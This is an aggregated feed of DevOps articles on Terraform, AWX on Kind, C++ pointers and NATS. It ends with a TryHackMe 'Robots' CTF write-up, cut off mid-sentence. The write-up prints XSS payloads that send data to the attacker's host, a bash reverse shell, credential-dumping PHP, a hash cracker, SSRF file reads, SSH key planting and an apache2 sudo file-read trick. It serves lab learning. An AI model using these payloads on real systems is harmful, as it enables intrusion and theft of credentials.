item.title: DAST is Broken, Not Dead. Dynamic Testing Must Evolve
item.author: Golan Yosef

item.title: Why API-First Engineering is the Way Forward for Software Development
item.author: Tishan Dahanayakage

item.title: Blending AI and DevSecOps: Enhancing Security in the Development Pipeline
item.author: Joydip Kanjilal

item.title: Perforce Acquires Snowtrack to Improve Collaboration Across Application Development Teams
item.author: Mike Vizard

item.title: Digest #164: GitHub Actions Pain, Wiz Joins Google, Handling Billions of AWS Lambda Invocations, CDK Migration and Prometheus
item.author: Mohamed Labouardy
item.content:encoded: Welcome to this week’s edition of the DevOps Bulletin!Wiz teams up with Google—what does this mean for cloud security? We take a closer look at compromised GitHub actions and explore ephemeral values in Terraform.Our featured podcast is about best practices for building a multi-tenant system. We’re also sharing an upcoming event on the future of DevOps and how to build a strong culture to shape better software delivery.In our tutorials, learn how to handle billions of AWS Lambda invocations, build a powerful March Madness dashboard with Grafana, migrate smoothly from Serverless Framework to AWS CDK, and master data governance using dbt, Terraform, and Dataplex. Scaling Prometheus to the enterprise level, building data ingestion solutions for Amazon Bedrock, and securing Lambda function logs through data masking were also covered.We’re also spotlighting practical open-source tools, including Stelvio, a Python library that simplifies cloud infrastructure management; Adminer, a simple and ready-to-deploy database management tool; mcp-kafka, which connects AI assistants directly to Apache Kafka; git-who, a handy CLI to quickly discover who wrote specific code; and KHI, a rich log visualization tool that displays Kubernetes logs in an interactive timeline.All this and more in this week’s DevOps Bulletin—don’t miss out!In partnership with BitriseDevOps evolution: what's next in 2025?Get actionable strategies for AI, platform engineering, & DevOps culture to shape software delivery. is a Python library that simplifies cloud infrastructure management and deployment. is a full-featured database management tool written in PHP. It consists of a single file ready to deploy to the target server. provides a bridge between AI assistants and Apache Kafka, allowing them to interact with Kafka clusters through the Model Context Protocol. is a command-line tool for answering that eternal question: Who wrote this code? is a rich log visualization tool for Kubernetes clusters. KHI transforms vast quantities of logs into an interactive, comprehensive timeline view.If you have feedback to share or are interested in sponsoring this newsletter, feel free to reach out via , or simply reply to this email.

item.title: ChatLoopBackOff Episode 51 (WasmEdge)
item.author: CNCF [Cloud Native Computing Foundation]
item.content:encoded:
WasmEdge is a CNCF Sandbox project that is a high-performance WebAssembly runtime optimized for cloud-native and edge computing use cases. It’s designed to run WebAssembly (Wasm) applications at the edge and in the cloud, offering a fast, efficient, and secure way to execute containerized applications.
Unlike traditional container runtimes, WasmEdge is designed to work efficiently with cloud-native ecosystems. Join CNCF Ambassador, Faeka Ansari as she explores how WasmEdge allows developers to run Wasm modules with low overhead.

item.title: ChatLoopBackOff Episode 51 (WasmEdge)
item.author: CNCF [Cloud Native Computing Foundation]
item.content:encoded:
WasmEdge is a CNCF Sandbox project that is a high-performance WebAssembly runtime optimized for cloud-native and edge computing use cases. It’s designed to run WebAssembly (Wasm) applications at the edge and in the cloud, offering a fast, efficient, and secure way to execute containerized applications.
Unlike traditional container runtimes, WasmEdge is designed to work efficiently with cloud-native ecosystems. Join CNCF Ambassador, Faeka Ansari as she explores how WasmEdge allows developers to run Wasm modules with low overhead.

item.content:encoded: Don't miss out! Join us at our next Flagship Conference: KubeCon + CloudNativeCon Europe in London from April 1 - 4, 2025. Connect with our current graduated, incubating, and sandbox projects as the community gathers to further the education and advancement of cloud native computing. Learn more at https://kubecon.io

item.title: Advanced Terraform Configuration
item.author: Nikhil Adinath Kamode
item.content:encoded: I hope you are doing well, So today we are going to explore about how terraform supports multiple cloud platforms ,multiple regions . let’s deep dive into this.Providers: Understanding how to work with different providers like AWS, Azure, and Google Cloud.Multiple Providers: Managing multiple providers in a single Terraform configuration to leverage diverse cloud services.Multiple Clouds: Provisioning resources across multiple cloud platforms, enhancing flexibility and scalability.Multiple Regions: Deploying infrastructure across different regions to ensure global reach and redundancy.Variables: Using variables to make Terraform configurations more dynamic and reusable.Built-in Functions: Leveraging Terraform’s built-in functions to manipulate data and enhance configuration logic.Conditional Expressions: Implementing conditional logic to create more sophisticated and adaptive infrastructure setups.Flexibility: Terraform allows you to manage infrastructure across multiple clouds and regions, making it easier to adapt to changing business needs.Efficiency: By using variables and built-in functions, you can automate complex tasks and reduce manual errors.Scalability: With conditional expressions, you can create infrastructure configurations that scale dynamically based on specific conditions.

item.title: Terraform as IaC
item.author: Nikhil Adinath Kamode
item.content:encoded: Here’s a professional and easy-to-understand guide on getting started with Terraform:Introduction to Terraform and Infrastructure as Code (IaC)Terraform is a powerful tool for managing infrastructure using Infrastructure as Code (IaC). IaC allows teams to manage and provision infrastructure in a consistent and automated manner, making it an essential component of modern software development. In this guide, we’ll explore the fundamental concepts of Terraform and IaC, and how they streamline infrastructure provisioning.Key Benefits of Terraform and IaC:: Ensures that infrastructure configurations are consistent across environments.: Automates the provisioning process, reducing manual errors.: Allows tracking of infrastructure changes like code.Installing Terraform on MacOS, Linux, and WindowsTo get started with Terraform, you need to install it on your operating system. Here are the steps for each platform:: Use Homebrew with the command brew install terraform.: Download and install from the official Terraform website.: Download the binary from the official Terraform website and add it to your PATH.Setting Up Terraform for AWSTo integrate Terraform with AWS, follow these steps:: Ensure the AWS CLI is installed on your system.: Run aws configure to set up your AWS credentials.Set Up AWS Provider in Terraform:terraform { required_providers { aws = { source = "hashicorp/aws" version = "~> 5.0" } } } provider "aws" { region = "us-east-1" }: Run terraform init to download the AWS provider plugin.Writing Your First Terraform CodeStart by creating a simple Terraform configuration file (main.tf) to define resources. For example, to create an S3 bucketresource "aws_s3_bucket" "example_bucket" { bucket = "example-terraform-bucket"Understanding the Terraform lifecycle is crucial:: Initializes the Terraform working directory.: Generates an execution plan: Applies the changes.Launching an EC2 InstanceTo provision an EC2 instance on AWS using Terraformresource "aws_instance" "example_instance" { ami = "ami-065deacbcaac64cf2" instance_type = "t2.micro" tags = { }Terraform state files are essential for managing infrastructure consistency:: The configuration you want.: The actual state of your infrastructure.: Manages these states to ensure consistency.This guide provides a comprehensive introduction to Terraform and its integration with AWS, helping you get started with managing infrastructure efficiently.Terraform as IaC was originally published in DevOps.dev on Medium, where people are continuing the conversation by highlighting and responding to this story.

item.title: Install Ansible AWX on Kubernetes (Kind)
item.author: Sandesh Sachdev
item.content:encoded: AWX, the open-source upstream project of Ansible Tower, is a powerful web-based platform for managing Ansible playbooks, inventories, and automation workflows. While AWX is typically deployed on production-grade Kubernetes clusters, this guide provides a detailed walkthrough for setting it up locally using Kind (Kubernetes in Docker). This lightweight approach is perfect for testing, learning, or running small-scale automation projects on a single machine.In this extensive knowledge base article, we’ll cover every step of the process, from configuring your server to deploying AWX with the AWX Operator, including an external PostgreSQL database and an Ansible playbook for automation. Whether you’re a DevOps enthusiast or an automation newbie, this guide will equip you with the knowledge to get AWX running smoothly.By the end of this article, you’ll know how to:Install and configure Kind on a Rocky Linux server.Set up an external PostgreSQL database for AWX persistence.Deploy AWX using the AWX Operator on a Kind cluster.For this setup, I have used a server as the base operating system. Below are the minimum recommended specifications and commands to verify your system:CPU : 8 Core ( 4 is recommeded )Memory : 16gb ( 8 is recommeded )For this Installation, I have created a directory under as a starting point.Kind is a tool that runs local Kubernetes clusters using Docker containers as nodes. For simplicity and to avoid multi-node complexities, we’ll configure a single-node cluster with a control-plane role.Create a file at with the following content:apiVersion: kind.x-k8s.io/v1alpha4kind: Clusternodes: extraPortMappings: hostPort: 80 protocol: tcp: Defines a single control-plane node for the cluster.: Maps port 80 on the host to port 32000 in the container, enabling HTTP access to AWX via http://<server-ip>:80.External PostgreSQL SetupAWX requires a PostgreSQL database for persistent storage. While it includes an embedded database option, using an external PostgreSQL instance offers better control and scalability. Here’s how to set it up:Step 1: Set Up PostgreSQLYou’ll need an external PostgreSQL server (e.g., on another machine or a cloud service). For this guide, assume it’s reachable at postgres.example.com:5432 with:Step 2: Create a Kubernetes SecretAWX uses a Kubernetes secret to securely store database credentials. Create a file named awx-postgres-secret.yamlapiVersion: v1kind: Secret name: sos-awx-postgres-configurationdata: host: cG9zdGdyZXMuZXhhbXBsZS5jb20= # “postgres.example.com” (base64) port: NTQzMg== # “5432” (base64) database: YXd4 # “awx” (base64) username: YXd4dXNlcg== # “awxuser” (base64) password: eW91cnBhc3N3b3Jk # “yourpassword” (base64) type: dW5tYW5hZ2Vk # “unmanaged” (base64) sslmode: ZGlzYWJsZQ== # “disable” (base64)type: OpaqueConvert your values to base64 using:$ echo -n “your-value” | base64Replace the placeholders with your encoded database details.Deploy the secret to your Kind cluster:$ kubectl apply -f awx-postgres-secret.yamlDocker Storage ConfigurationDocker stores container data in by default, which may fill up quickly on a small root partition. To avoid this, relocate the Docker data directory to ( or any other suitable path which has more space ).$ sudo mkdir -p /data/docker: Edit or create /etc/docker/daemon.json:{ “data-root”: “/data/docker”$ sudo systemctl restart docker`$ docker info — format ‘{{.DockerRootDir}}’In this setup we are going to uses the following versions:: Rocky Linux 9.xBefore diving in, ensure these conditions are met:: No other services should use port that we are going to configure on host ( In this Setup we are going to use port 80 ) . Check with:$ sudo netstat -tuln | grep :80Stop conflicting services (e.g., sudo systemctl stop nginx).Note : Use single node cluster if Multi Node cluster doesn’t work.We will use single node kubernetes cluster to make it simple.Step-by-Step Installation$ sudo dnf install -y docker-ce docker-ce-cli containerd.io vim git nginx htop nfs-utils$ sudo systemctl enable docker$ sudo systemctl start docker$ curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.27.0/kind-linux-amd64$ chmod +x ./kind$ sudo mv ./kind /usr/bin/kind$ curl -LO “https://dl.k8s.io/release/v1.32.2/bin/linux/amd64/kubectl"$ chmod +x kubectl$ sudo mv kubectl /usr/local/bin/kubectlCreating Kind Cluster ( Kubernetes Cluster )Set up the AWX directory and create the cluster:$ sudo mkdir -p /etc/awx# Add kind.config as shown in Kind Configuration$ sudo kind create cluster — name awx — config /etc/awx/kind.config — image kindest/node:v1.32.2Install Nginx Ingress ControllerDeploy the Nginx Ingress Controller for Kind:$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yamlClone the AWX Operator repository$ sudo git clone https://github.com/ansible/awx-operator /etc/awx/awx-operator$ cd /etc/awx/awx-operator$ sudo git checkout 2.17.0Create kustomization.yaml in /etc/awx/awx-operator:apiVersion: kustomize.config.k8s.io/v1beta1kind: Kustomization — github.com/ansible/awx-operator/config/default?ref=2.17.0 — name: quay.io/ansible/awx-operatornamespace: awx$ kubectl apply -k /etc/awx/awx-operatorConfigure External PostgreSQLApply the secret as described in External PostgreSQL Setup.$ kubectl apply -f awx-postgres-secret.yamlCreate awx-cr.yaml in :apiVersion: awx.ansible.com/v1beta1kind: AWX name: sos-awx service_type: nodeport postgres_configuration_secret: sos-awx-postgres-configurationApply the above yaml configuaration$ kubectl apply -f /etc/awx/awx-operator/awx-cr.yamlYou should be able to see the cluster being created.$ kubectl get deployments,pods,svc,sc -n awxIf you don’t want to use external postgres server, you can skip installing postgres secret and applying it. As, AWX operator would create a postgres server for you.Updated awx-cr.yml file would look likeapiVersion: awx.ansible.com/v1beta1kind: AWX name: sos-awx service_type: nodeport

item.title: Kube-Pprometheus-Stack vs. k8s-Monitoring-Helm: Which One Should You Use for Kubernetes Monitoring?

item.content:encoded: Keeping tabs on what’s happening inside a Kubernetes cluster is no small feat. Between metrics, logs, and traces, monitoring can quickly…

item.title: Mastering Pointers in C++
item.author: Syed Hamed Raza
item.content:encoded: Pointers are one of the most powerful and essential concepts in C++. They allow , improving efficiency and flexibility. While pointers can be complex, mastering them is crucial for dynamic memory management, data structures (like linked lists), and system-level programming.This article covers everything about pointers in C++, from basic syntax to advanced concepts like dynamic memory allocation, pointer arithmetic, and smart pointers.1. Introduction to PointersA is a variable that stores the memory address of another variable. Instead of storing a value directly, it holds a reference to a memory location.✔ Efficient Memory Management — Enables dynamic memory allocation. ✔ — Direct memory manipulation speeds up computations. ✔ Useful in Data Structures — Essential for linked lists, trees, and graphs. ✔ — Allows modifying variables inside functions efficiently.Memory Representation of a PointerEach variable in memory has:A (actual data stored).An (where the data is stored in RAM).Syntax of Pointers in C++type *pointerName; // Declaring a pointerpointerName = &variable; // Assigning address of variable2. Declaring and Initializing Pointersint num = 10;int *ptr = # // Pointer stores address of numExample: Declaring and Using Pointers#include <iostream>using namespace std; int num = 42; cout << "Value of num: " << num << endl; cout << "Address of num: " << &num << endl; cout << "Value using pointer: " << *ptr << endl; cout << "Address stored in pointer: " << ptr << endl;}Value of num: 42Address of num: 0x61ff08Address stored in pointer: 0x61ff08Pointers support such as: – Moves to the next memory location. – Moves to the previous memory location. – Moves forward by n elements. – Moves backward by n elements.Example: Pointer Arithmetic#include <iostream>using namespace std; int arr[] = {10, 20, 30}; cout << "First element: " << *ptr << endl; ptr++; cout << "Second element: " << *ptr << endl; ptr++; cout << "Third element: " << *ptr << endl;}First element: 10Second element: 20Pointers and arrays are closely related. The array name acts like a to its first element.Example: Accessing Array Elements Using Pointers#include <iostream>using namespace std; int arr[] = {1, 2, 3, 4, 5}; for (int i = 0; i < 5; i++) { cout << "Value at arr[" << i << "]: " << *(ptr + i) << endl;}5. Pointers and FunctionsPointers allow efficient passing of arguments to functions, avoiding unnecessary memory duplication.Example: Passing Pointers to Functions#include <iostream>using namespace std;void increment(int *ptr) { (*ptr)++; int num = 10; cout << "Before: " << num << endl; increment(&num); cout << "After: " << num << endl;}6. Dynamic Memory AllocationWhy Dynamic Memory Allocation?Dynamic memory allocation allows creating variables at runtime using:delete – Deallocates memory.Example: Using new and delete#include <iostream>using namespace std; int *ptr = new int(10); cout << "Dynamically allocated value: " << *ptr << endl; delete ptr; // Free memory}Example: Allocating Arrays Dynamically#include <iostream>using namespace std; int *arr = new int[5]; for (int i = 0; i < 5; i++) { arr[i] = i * 10; for (int i = 0; i < 5; i++) { cout << "Value at arr[" << i << "]: " << arr[i] << endl; delete[] arr; // Free memory}A stores the address of another pointer.Example: Pointer to Pointer#include <iostream>using namespace std; int num = 10; int **ptr2 = &ptr; cout << "Value of num: " << num << endl; cout << "Value using pointer: " << *ptr << endl; cout << "Value using pointer to pointer: " << **ptr2 << endl;}8. Pointers and StructuresPointers can be used with structures to manipulate .Example: Using Pointers with Structures#include <iostream>using namespace std; string name;}; Student s1 = {"Alice", 20}; cout << "Student Name: " << ptr->name << endl; cout << "Student Age: " << ptr->age << endl;}9. Smart Pointers in C++ (C++11)Smart pointers automate memory management, reducing . – Sole ownership of an object. – Shared ownership, reference count. – Non-owning reference.Example: Using unique_ptr#include <iostream>#include <memory> unique_ptr<int> ptr = make_unique<int>(10); cout << "Value: " << *ptr << endl;}10. Best Practices with Pointers✔ Always initialize pointers (ptr = nullptr;). ✔ (Always delete allocated memory). ✔ (unique_ptr, shared_ptr). ✔ (ptr = nullptr; after delete).Pointers with efficient memory management and in C++. From to , mastering pointers enhances program efficiency.

item.title: How I Solved Cross-Account DNS Resolution for EKS Logs in ELK on AWS
item.author: Adnan Rafi
item.content:encoded: For one of my North American client, I was tasked with sending logs and traces from an application running on an Amazon EKS cluster in the…

item.title: NATS as a Service Mesh — The Lightweight Superhero Your Microservices Deserve
item.author: Cristhian Ferrufino
item.content:encoded: NATS as a Service Mesh — The Lightweight Superhero Your Microservices DeserveWelcome back to the ! In our last adventure, we turned you into a containerization wizard with Docker and Kubernetes. Now, it’s time to tackle — the unsung heroes of microservices communication. Spoiler: NATS is about to make your life way easier.What’s a Service Mesh, Anyway?Imagine you’re hosting a party where all your friends (microservices) need to talk to each other. A service mesh is like the ultimate promoter: it handles introductions, ensures no one’s left out, and stops the DJ (your database) from getting overwhelmed. In technical terms, a service mesh manages communication between services, handling load balancing, retries, security, and observability.But traditional service meshes like and can feel like hiring a promoter who brings their own entourage (sidecars, proxies, and a PhD in YAML). Enter : the lightweight, no-nonsense alternative that’s here to simplify your life.Service Meshes: The Usual SuspectsLet’s compare the heavyweights:+--------------------+-------------------------------+-------------------------------+------------------------------------------+| Feature | Istio | Linkerd | NATS |+--------------------+-------------------------------+-------------------------------+------------------------------------------+| Complexity | High (Envoy sidecars, CRDs) | Moderate (Rust-based proxies) | Low (No sidecars!) || Latency | Medium (Proxy overhead) | Low | Ultra-low (Bare metal) || Setup | "Read the 50-page manual" 📖 | "Read the 20-page manual" 📘 | "Run `nats-server`" 💻 || Messaging Patterns | Limited (HTTP/gRPC focus) | Limited (HTTP/gRPC focus) | Pub/Sub, Request-Reply, Queue Groups 🎯 || Learning Curve | Steeper than a mountain 🏔️ | Hilly ⛰️ | Gentle slope 🌄 |+--------------------+-------------------------------+-------------------------------+------------------------------------------+Why Traditional Meshes Hurt Your Brain?: Powerful, but you’ll need a dedicated team to manage its sidecars and configurations.: Simpler, but still requires proxies and leans heavily on HTTP/gRPC.: Skips the proxies, embraces simplicity, and handles messaging pattern. 🤯NATS as a Service Mesh: Less YAML, More Magic ✨NATS wasn’t *designed* as a service mesh, but its architecture makes it a natural fit. Here’s how it steals the show:apiVersion: apps/v1kind: Deployment name: nats replicas: 3 spec: - name: nats ports:NATS uses a binary protocol over TCP, bypassing HTTP overhead. Benchmarks show it handles **1M+ messages/sec** with sub-millisecond latency. Perfect for real-time apps.3. One Tool, Many Superpowers: Broadcast events to multiple services.: Sync communication, like REST but faster.: Load-balance messages across replicas.: Add persistence when you need it.nc, _ := nats.Connect("nats://nats:4222")nc.Subscribe("orders.created", func(msg *nats.Msg) { fmt.Printf("Order received: %s\n", string(msg.Data))}): Encrypt traffic between services and NATS with TLS-first Handshake.: with Token Authentication, Plain Text Username/Password, Bcrypted Username/Password, TLS Certificate, NKEY with Challenge or Decentralized JWT Authentication/Authorization to choose from.: With a robust subject-level permissions on a per-user basis.: NATS keeps it straightforward.When Should You Use NATS as a Service Mesh?You need (IoT, gaming, real-time analytics).You’re tired of managing sidecars and proxies.Your app uses (HTTP, WebSocket or MQTT).You want to without sacrificing power.Now that your microservices are chatting smoothly with NATS, how do you know if they’re happy? In the next article, we’ll dive into with Prometheus, Grafana, and Jaeger. Learn how to monitor, trace, and debug your cloud-native apps like a pro. Spoiler: Your future self will thank you when things go sideways at 2 AM. 😅 💬 What’s your #1 struggle with your service mesh? config? Debugging? Share below! ❤️ Happy coding, and stay tuned for the next chapter in the !

item.title: Robots (CTF) — TryHackMe Writeup
item.author: z0diac
item.content:encoded: Robots (CTF) — TryHackMe WriteupA (small) tribute to I. Asimov.In this Capture The Flag (CTF) walkthrough, we explore the challenge on TryHackMe. This challenge emphasizes the importance of proper access control and the risks of exposing sensitive directories. By enumerating , we discover hidden directories and retrieve credentials, allowing us to gain an initial foothold. Further privilege escalation via leads to full system compromise. This write-up highlights the dangers of misconfigured access controls, weak credential management, and improperly set file permissions in Linux environments.To get an overview of the open ports on the target system, perform a ping scan using the following command:sudo nmap -Pn -vv -T4 -n <ip>Then to get a full scan, use this following command:sudo nmap -A -vv -T4 -n <ip>We notice a robots.txt file, which contains three disallowed entries:/harming/humans /ignoring/human/orders These paths seem to reference Asimov’s Three Laws of Robotics (xd), which could be a hint for our next steps. We will investigate these directories further to see if they contain anything useful.To make navigation easier, we add the target IP to /etc/hosts with the hostname robots.thmAfter navigating to the website, we encountered a 403 Forbidden error on the main page. To bypass this restriction, we checked the disallowed paths from robots.txt. Most of them returned the same 403 Forbidden response, except for , which redirected us to a "recruitment campaign" page.This page includes both a and form, which could be potential attack vectors. We will investigate further.On the , we notice a hint:“An admin monitors new users.”Recalling my write-up, this suggests a possible client-side attack targeting the admin. However, before diving into that, we focus on another crucial detail — .The page states that the password format follows:username is the chosen username.ddmm represents the of registration.I proceeded to create an account using:Based on the given hashing format, I generated the password using the following command:After getting the hash, I headed straight to the login page and logged in.Once inside, I noticed a few interesting things. In the top left corner, there’s a link, and below, I can see the admin’s last login timestamp. This could be useful later, so I’ll keep it in mind while exploring the rest of the site.Curious about the link, I clicked on it and, to my surprise, it led to a page! This is interesting because exposes a lot of useful information, like server configurations, loaded extensions, and environment variables.I took notes on a few interesting things in the section. Specifically, I found: – This might give insights into how session management works. – This shows the internal server IP, which could be useful later.Client-Side Attack — Stored XSSLet’s jog our memory about the for a second. We noticed two suspicious things earlier:The message “An admin monitors new users” — suggesting that the admin might manually review new accounts.The — if it’s not properly sanitized, it could be vulnerable to XSS.With this in mind, we can try injecting an into the username field. If the admin views our profile, the script will execute and send us the HTML content of their page, potentially exposing sensitive information.We use the following payload:Once executed, this script will and send it to our server (10.4.61.251:4444). If successful, we might retrieve the admin's <script>new Image().src="http://10.4.61.251:4444/?data="+btoa(document.body.innerHTML);</script>BOOM! 🎉 We got a from the admin’s session.With this response, we can confirm that we are viewing the . One key indicator is the displayed on the page, which is something a regular user wouldn’t normally have access to.This means our XSS attack worked perfectly, and now we might be able to take further actions as the admin. Time to explore what we can do next!I tried to steal the admin’s cookies using document.cookie, but I quickly realized that the flag was set to . This means that JavaScript can’t access the cookies, preventing us from directly grabbing the session token.However, since our XSS payload still executes in the admin’s session, we might be able to perform actions as the admin instead.Remember that we got from the admin? It contained a link to .You thinking what I’m thinking? That’s right!Since we know our XSS payload runs in the , we can make them visit on their own browser. This means we’ll get a fresh page from the admin’s perspective. And if we’re lucky, we might find something juicy — like the sitting in the $_COOKIE or HTTP_COOKIE section.I decided to craft this payload so that:The script makes the request server_info.php, retrieving the with their session details.It then the response (btoa(data)) to ensure safe transmission.Finally, it to my attacker’s server (10.4.61.251:5555/log.php) for me to analyze.<script>fetch('/harm/to/self/server_info.php') .then(response => response.text()) .then(data => { fetch('http://10.4.61.251:5555/log.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'output=' + encodeURIComponent(btoa(data)) });To capture the stolen data, I created a file on my attacker’s server:<?phpif ($_SERVER["REQUEST_METHOD"] === "POST") { $data = isset($_POST["output"]) ? $_POST["output"] : "No data received"; file_put_contents("log.txt", base64_decode($data) . "\n", FILE_APPEND | LOCK_EX);} else { echo "Invalid request method.";}Since the regular can’t handle (or at least not easily without modifications), I decided to use instead. I created a simple Flask server to handle incoming data and log it:from flask import Flask, request@app.route('/log.php', methods=['POST'])def log_data(): data = request.form.get("output", "No data received") with open("log.txt", "a") as f: return "Data received!", 200app.run(host='0.0.0.0', port=5555)Now that everything is set up, it’s time to to the during registration.On the , we finally received a to /log.php—which means the admin I checked log.txt, and there it was: a .After decoding, we got the , and grep the I replaced my with the stolen one using , refreshed the page, and boom — we’re in the admin panel!I ran on /harm/to/self and found .Inside, there’s a and a button. The page says , which looks like it might be making a request to whatever URL we enter. This is getting more interesting!SSRF Leading to Remote Code Execution (RCE)I had a feeling this could be , so I started an and tested it by requesting bruh.txt.Sure enough, when the request was processed, the page displayed , confirming that the server is fetching and displaying external content.Now, let’s see how far we can push this.Then, I created a file named with the following content:This will execute the id command when accessed, revealing the user under which the web server is running.Next, I hosted it on my HTTP server and used the Test URL feature to request bruh.php. If the serverit instead of just displaying it, we might have Remote Code Execution (RCE)!Then, I crafted the following payload to get Remote Code Execution (RCE):<?php system("bash -c 'bash -i >& /dev/tcp/10.4.61.251/6666 0>&1'"); ?>I saved this as , started my HTTP server, and used the feature to request:I listed the files and noticed —this could contain or other sensitive info.And yeah, contained , including:Off the screen, I also tried scanning the for port but didn’t find anything open.But, since we know the , we can use getent to check its actual IP:The getent command revealed that resolves to —this means the database is running in a Docker or internal network.Since we’re in a , MySQL wasn’t installed, so I couldn’t connect directly using the mysql command.Then, I thought — how does the application store user credentials? Maybe register.php can give us a clue.I used and found that the app uses for database interactions!Then, I crafted this payload and stored it in so I could execute it. I also tested whether PHP was installed—and it was.This payload lists all tables in the database:<?phptry { \$conn = new PDO('mysql:host=172.18.0.2;dbname=web', 'robots', '[REDACTED]'); \$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // Tampilkan semua tabel dalam database 'web' \$result = \$conn->query('SHOW TABLES'); echo \"Tables in web:\\n\"; while (\$row = \$result->fetch(PDO::FETCH_NUM)) { echo \"- \" . \$row[0] . \"\\n\"; }} catch (PDOException \$e) { echo 'Connection failed: ' . \$e->getMessage();?>After running it with php /tmp/db_pdo.php, I successfully retrieved a list of database tables. Unfortunately, I forgot to take a screenshot, but I noticed an interesting table—!Then, I crafted this payload to check the structure of the table:<?phptry { \$conn = new PDO('mysql:host=172.18.0.2;dbname=web', 'robots', '[REDACTED]'); \$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \$result = \$conn->query('DESC users'); echo \"Columns in users:\\n\"; while (\$row = \$result->fetch(PDO::FETCH_ASSOC)) { echo \"- \" . \$row['Field'] . \" (\" . \$row['Type'] . \")\\n\"; }} catch (PDOException \$e) { echo 'Connection failed: ' . \$e->getMessage();?>After executing it with php db_columns.php, I retrieved the column names and data types of the users table. And there it is—the ones we were looking for: and !Now, it’s time to dump the data and see if we can get some credentials.Lastly, I crafted this payload to dump all the data from the users table:<?phptry { \$conn = new PDO('mysql:host=172.18.0.2;dbname=web', 'robots', '[REDACTED]'); \$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // Ambil semua data dari tabel users \$result = \$conn->query('SELECT * FROM users'); echo \"\\n=== Users Table ===\\n\"; while (\$row = \$result->fetch(PDO::FETCH_ASSOC)) { echo \"ID: {\$row['id']}\\nUsername: {\$row['username']}\\nPassword: {\$row['password']}\\nGroup: {\$row['group']}\\n\\n\"; }} catch (PDOException \$e) { echo 'Connection failed: ' . \$e->getMessage();?>After executing it with php db_dump_users.php, I successfully extracted all usernames and passwords from the database. From the output, we found a username with a .But I noticed something strange. I tried generating an hash for one of the users using the format (as hinted earlier). However, when I compared it to the dumped password, it !I don’t know if I just got lucky or what, but I figured out that the password is ! Instead of just md5(username + ddmm), the output of that hash is hashed , making it:md5(md5(username + ddmm))Once I tried hashing it this way, It matched the dumped password.So to wrap things up, with the help of ChatGPT, we crafted a Python script to replicate the double-hash process and match dumped password.import hashlib return hashlib.md5(text.encode()).hexdigest()def generate_passwords(username): for day in range(1, 32): for month in range(1, 13): password = f"{username}{day:02}{month:02}" first_hash = md5_hash(password) second_hash = md5_hash(first_hash) yield password, second_hashdef crack_hash(target_hash, username): for password, hashed in generate_passwords(username): if hashed == target_hash: print(f"[+] Password ditemukan: {password}") print("[-] Gagal menemukan password")if __name__ == "__main__": username = "rgiskard" target_hash = "[REDACTED]" crack_hash(target_hash, username)Execute it and we got the (username+mm) of this rgiskard guy!Now, to generate the , we recall the rule from the register page:Since we already figured out that the dumped password was , we now just need to generate the first MD5 hash of:After hashing "rgiskard****" (with the correct date format), we successfully got ! Time to log in and see what’s nextThen, I rgiskard@robots.thm using the recovered password and We got our as the rgiskard user!Privilege Escalation to DolivawI ran some basic privilege escalation commands, starting with:From the output of sudo -l, we can see that can run the following command as without a password:sudo -u dolivaw /usr/bin/curl 127.0.0.1/*sudo -u dolivaw → This means rgiskard can execute commands as dolivaw./usr/bin/curl → The command allowed is curl, which is used to make HTTP requests.127.0.0.1/* → This means we can curl endpoint on the local machine.Since I had access to curl as , I attempted to request 127.0.0.1 to check for any available endpoints.To check for potential , I attempted to read /etc/passwd using the file:// scheme. The command returned the contents of /etc/passwd, confiming the LFI via SSRF.Since flags are often stored in user.txt, I ran the following command and we got the first flag!I attempted to any script onto the target machine using curl .After running the command, I received a response confirming that the file was successfully retrieved.Then I attempted to look inside Dolivaw’s home directory by accessing file:///../home/dolivaw/.ssh/, but nothing was returned. However, based on the response body—which did not contain "file/directory not found"—I could confirm that the directory exists.With this, we can place our id_rsa.pub key inside Dolivaw's .ssh/authorized_keys file, allowing us to access the account remotely from our machine using our private key.But first, we need to generate an SSH key pair using the following command:This will create two files:We’ll use the public key to gain access to Dolivaw’s account.Then I attempted to download your id_rsa.pub file from your web server (http://10.4.61.251:80/id_rsa.pub) and write it to /home/dolivaw/.ssh/authorized_keys.After that, I rechecked whether my id_rsa.pub was successfully added by navigating to “file:///home/dolivaw/.ssh/authorized_keys”. Upon checking, I confirmed that my public key was indeed present in the authorized_keys file, meaning I could now authenticate as dolivaw using my private key!On my machine, I used SSH to connect to dolivaw@robots.thm using my private key. The authentication was successful, and I gained access to the dolivaw user!Root Privilege EscalationI ran sudo -l and fount out that the output reveals that the dolivaw user can run /usr/sbin/apache2 as root without requiring a password (NOPASSWD).This means there is a potential privilege escalation (privesc) opportunity using Apache2. Since Apache2 is a service that can be manipulated to execute commands as root, we can attempt to exploit this permission to gain root access.Based on GTFOBins, we can exploit Apache2’s sudo permission by reading arbitrary files as root using the following command:This works because Apache2 runs with elevated privileges when executed via sudo, and the Include directive allows loading arbitrary files.Then I tried to follow the GTFOBins method, but it failed. The error message indicated that the APACHE_RUN_DIR variable was not defined.Since Apache requires APACHE_RUN_DIR to store its runtime files (such as PID files and logs), I tried setting it manually using:export APACHE_RUN_DIR=/tmpTo manually override this, I tried setting APACHE_RUN_DIR=/tmp and exporting it before running the command. However, this did not work, likely because sudo does not preserve exported environment variables by default when executing commands as another user.Instead, I used the following command to explicitly define APACHE_RUN_DIR as /tmp within the execution of Apache itself:sudo -u root /usr/sbin/apache2 -C "Define APACHE_RUN_DIR /tmp" -C "Include $LFILE" -k stopsudo -u root /usr/sbin/apache2: Runs the Apache binary as root.-C "Define APACHE_RUN_DIR /tmp": Defines APACHE_RUN_DIR dynamically within Apache’s configuration, bypassing the missing environment variable issue.-C "Include $LFILE": Forces Apache to include an arbitrary file ($LFILE) in its configuration. If $LFILE is a sensitive file (like /root/root.txt), its contents can be exposed.-k stop: Attempts to stop the Apache process, forcing it to parse the injected configuration file before shutting down.Since Apache runs with root privileges in this scenario, it successfully reads the target file, allowing me to extract the root flags!This challenge demonstrated how exposed files and misconfigurations can lead to a complete system compromise. By enumerating , I was able to uncover hidden directories containing credentials, which provided initial access to the machine. Leveraging these credentials, I escalated privileges by exploiting an SUID binary misconfiguration, ultimately 